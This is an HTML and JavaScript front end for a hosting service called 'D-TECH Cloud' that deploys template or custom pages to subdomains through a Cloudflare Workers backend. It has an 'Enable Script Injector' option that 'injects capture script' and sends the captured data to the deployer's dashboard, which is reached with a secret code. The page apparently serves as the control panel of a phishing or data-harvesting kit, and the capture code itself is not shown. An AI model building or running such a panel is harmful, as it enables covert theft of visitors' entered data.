<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>D-TECH Cloud Hosting</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <nav class="navbar">
        <a href="index.html" class="navbar-brand">
            <img src="logo.png" alt="D-TECH Logo">
            D-TECH Cloud
        </a>
        <div class="nav-links">
            <a href="index.html" class="active">Deploy</a>
            <a href="dashboard.html">Dashboard</a>
        </div>
    </nav>

    <div class="container">
        <div class="card">
            <h1 class="text-center">ðŸš€ Deploy Your Site</h1>
            <p class="text-center" style="color: var(--text-muted); margin-bottom: 2rem;">Choose a template or upload your own HTML.</p>

            <div class="mode-switch">
                <div id="btn-mode-template" class="mode-btn active" onclick="setMode('template')">Use Template</div>
                <div id="btn-mode-custom" class="mode-btn" onclick="setMode('custom')">Custom HTML</div>
            </div>

            <div id="section-template" class="form-group">
                <label>Choose Template</label>
                <select id="templateName">
                    <option value="">Loading templates...</option>
                </select>
            </div>

            <div id="section-custom" class="form-group hidden">
                <label>Upload HTML File</label>
                <input type="file" onchange="loadFile(this, 'customHtml')" accept=".html,.txt" style="margin-bottom: 10px;">

                <label>Or Paste HTML Code</label>
                <textarea id="customHtml" placeholder="<!DOCTYPE html><html>...</html>" style="height: 150px; font-family: monospace;"></textarea>

                <div style="margin-top: 15px; background: var(--input-bg); padding: 15px; border-radius: 6px; border: 1px solid var(--border-color);">
                    <label style="display:flex; align-items:center; cursor:pointer; margin-bottom: 0;">
                        <input type="checkbox" id="enableInjector" style="width:auto; margin-right: 10px;">
                        <span style="font-weight:bold; color: var(--primary-color);">Enable Script Injector</span>
                    </label>
                    <small style="color: var(--text-muted); display:block; margin-top:5px; line-height: 1.4;">
                        <strong>ON:</strong> Injects capture script. Data is sent to your dashboard.<br>
                        <strong>OFF:</strong> Hosts static HTML only. No data capture.
                    </small>
                </div>
            </div>

            <div class="form-group">
                <label>Subdomain Name</label>
                <input type="text" id="subdomain" placeholder="e.g., mysite">
            </div>

            <div class="form-group">
                <label>Unique Secret Code</label>
                <input type="text" id="uniqueCode" placeholder="Create a secret code (for accessing data)">
            </div>

            <button onclick="deploy()">Deploy Now</button>

            <div id="message" class="message"></div>
        </div>

        <div class="text-center" style="margin-top: 2rem;">
            <a href="dashboard.html" style="color: var(--primary-color); text-decoration: none;">Access User Dashboard</a>
        </div>
    </div>

    <script>
        const WORKER_URL = 'https://calm-bread-1d99.testdx24.workers.dev';
        let currentMode = 'template';

        function setMode(mode) {
            currentMode = mode;
            // Toggle Buttons
            document.getElementById('btn-mode-template').classList.toggle('active', mode === 'template');
            document.getElementById('btn-mode-custom').classList.toggle('active', mode === 'custom');

            // Toggle Sections
            document.getElementById('section-template').classList.toggle('hidden', mode !== 'template');
            document.getElementById('section-custom').classList.toggle('hidden', mode !== 'custom');
        }

        function loadFile(input, targetId) {
            const file = input.files[0];
            if (!file) return;
            const reader = new FileReader();
            reader.onload = function(e) {
                document.getElementById(targetId).value = e.target.result;
            };
            reader.readAsText(file);
        }

        async function loadTemplates() {
            const select = document.getElementById('templateName');
            try {
                const res = await fetch(`${WORKER_URL}/api/public/templates`);
                const data = await res.json();

                if (data.success) {
                    select.innerHTML = '';
                    const defaultOpt = document.createElement('option');
                    defaultOpt.value = "";
                    defaultOpt.textContent = "-- Select a Template --";
                    select.appendChild(defaultOpt);

                    data.data.forEach(t => {
                        const opt = document.createElement('option');
                        opt.value = t;
                        opt.textContent = t;
                        select.appendChild(opt);
                    });
                } else {
                     select.innerHTML = '';
                     const errOpt = document.createElement('option');
                     errOpt.textContent = "Error loading templates";
                     select.appendChild(errOpt);
                }
            } catch (e) {
                console.error(e);
                select.innerHTML = '';
                const errOpt = document.createElement('option');
                errOpt.textContent = "Network Error";
                select.appendChild(errOpt);
            }
        }

        async function deploy() {
            const subdomain = document.getElementById('subdomain').value;
            const uniqueCode = document.getElementById('uniqueCode').value;
            const btn = document.querySelector('button[onclick="deploy()"]');

            if (!subdomain || !uniqueCode) {
                showMessage('Please fill in Subdomain and Unique Code.', 'error');
                return;
            }

            const payload = { subdomain, uniqueCode };

            if (currentMode === 'template') {
                payload.templateName = document.getElementById('templateName').value;
                if (!payload.templateName) {
                    showMessage('Please select a template.', 'error');
                    return;
                }
            } else {
                payload.customHtml = document.getElementById('customHtml').value;
                payload.enableInjector = document.getElementById('enableInjector').checked;
                if (!payload.customHtml) {
                    showMessage('Please provide HTML content.', 'error');
                    return;
                }
            }

            btn.innerText = 'Deploying...';
            btn.disabled = true;
            showMessage('', '');

            try {
                const res = await fetch(`${WORKER_URL}/api/public/deploy`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(payload)
                });
                const data = await res.json();

                if (data.success) {
                    showMessage('Deployment Successful! Redirecting...', 'success');
                    setTimeout(() => {
                        window.location.href = data.url;
                    }, 2000);
                } else {
                    showMessage(data.error, 'error');
                    btn.innerText = 'Deploy Now';
                    btn.disabled = false;
                }
            } catch (e) {
                showMessage('Network Error: ' + e.message, 'error');
                btn.innerText = 'Deploy Now';
                btn.disabled = false;
            }
        }

        function showMessage(text, type) {
            const el = document.getElementById('message');
            el.innerText = text;

            // Map simple types to CSS classes
            el.className = 'message ' + type;

            el.style.display = text ? 'block' : 'none';
        }

        // Load templates on start
        loadTemplates();
    </script>
</body>
</html>
